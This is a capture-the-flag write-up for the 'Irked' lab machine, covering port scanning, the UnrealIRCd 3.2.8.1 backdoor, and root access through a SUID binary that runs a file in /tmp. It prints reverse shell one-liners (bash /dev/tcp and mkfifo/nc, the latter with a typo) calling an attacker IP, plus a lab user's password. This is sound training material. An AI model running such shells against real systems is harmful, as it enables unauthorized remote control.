# Irked
## Information Gathering
#### Ports/Services
x 22/tcp      ssh     
80/tcp      http    
x 111/tcp     rpcbind 
? 6697/tcp    irc     
8067/tcp    irc     
x 37435/tcp   status  
65534/tcp   irc

## Enumeration
### Nmap scan
```bash
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA==
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8=
|   256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesnt have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37435/tcp   status
|   100024  1          42129/udp6  status
|   100024  1          50128/udp   status
|_  100024  1          50871/tcp6  status
6697/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
8067/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
37435/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
65534/tcp open  irc     syn-ack ttl 63 UnrealIRCd
```

### 22/tcp
- OpenSSH 6.7p1 Debian 5+deb8u4

### 80/tcp
- Software
	- Apache httpd 2.4.10

Directory Busting at root
```
/manual/
```

### 111/tcp
### 6697/tcp
- UnrealIRCd
- Admin email djmardov@irked.htb
- Exploits
	- [Backdoor command execution 3.2.8.1](https://www.exploit-db.com/exploits/16922) - True positive

- Connecting to the IRC server
```bash
nc -nv 10.10.10.117 6697
USER default 0 * default
NICK default

:irked.htb 001 default :Welcome to the ROXnet IRC Network default!USER@10.10.14.17
:irked.htb 002 default :Your host is irked.htb, running version Unreal3.2.8.1
```

### 8067/tcp
- UnrealIRCd

### 65534/tcp
- UnrealIRCd

## Exploitation
Running the backdoor command execution gives a shell as ircd.
```bash
msf> use unix/irc/unreal_ircd_3281_backdoor

bash -c 'bash -i >& /dev/tcp/10.10.14.17/666 0>&1'
```

## Privilege Escalation

Looking at SUID binaries
```
-rwxr-sr-x 1 root mail 13680 Dec 24  2016 /usr/lib/evolution/camel-lock-helper-1.2
-rwxr-sr-x 1 root utmp 13992 Jun 23  2014 /usr/lib/libvte-2.90-9/gnome-pty-helper
-rwxr-sr-x 1 root utmp 13992 Dec  5  2014 /usr/lib/libvte-2.91-0/gnome-pty-helper
-rwxr-sr-x 1 root utmp 4972 Feb 21  2011 /usr/lib/utempter/utempter
-rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd
-rwxr-sr-x 1 root tty 26240 Mar 29  2015 /usr/bin/wall
-rwxr-sr-x 1 root mail 17880 Nov 18  2017 /usr/bin/lockfile
-rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 50644 Sep 30  2014 /usr/bin/at
-rwxr-sr-x 1 root shadow 21964 May 17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 9680 Oct 17  2014 /usr/bin/bsd-write
-rwxr-sr-x 1 root mail 9772 Dec  4  2014 /usr/bin/mutt_dotlock
-rwxr-sr-x 1 root ssh 419192 Nov 19  2017 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec
-rwxr-sr-x 1 root mail 13892 Jun  2  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root crontab 38844 Jun  7  2015 /usr/bin/crontab
-rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd
-rwxr-sr-x 1 root mlocate 32116 Jun 13  2013 /usr/bin/mlocate
-rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn
-rwxr-sr-x 1 root shadow 61232 May 17  2017 /usr/bin/chage
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
-rwsr-xr-x 1 root root 96760 Aug 13  2014 /sbin/mount.nfs
-rwxr-sr-x 1 root shadow 34424 May 27  2017 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 38868 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34684 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 34208 Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root 161584 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 26344 Mar 29  2015 /bin/umount
```

There is an odd executable `/usr/bin/viewuser`. When attempting to run this:
```bash
$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2022-09-27 08:34 (:0)
djmardov pts/3        2022-09-27 23:47 (10.10.14.17)
sh: 1: /tmp/listusers: not found
```

I write a reverse shell one-liner and change the permissions to /tmp/listusers
```bash
$ echo "rm /tmp/f;mkfifio /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.17 1337 > /tmp/f" > /tmp/listusers
$ chmod 777 /tmp/listusers
```

Spinning up a reverse shell `nc -lnvp 1337` and running `/usr/bin/viewuser` will catch a reverse shell as root. This also gets you the credentials: `djmardov:Kab6h+m+bbp2J:HG`. You can use this to SSH into the box.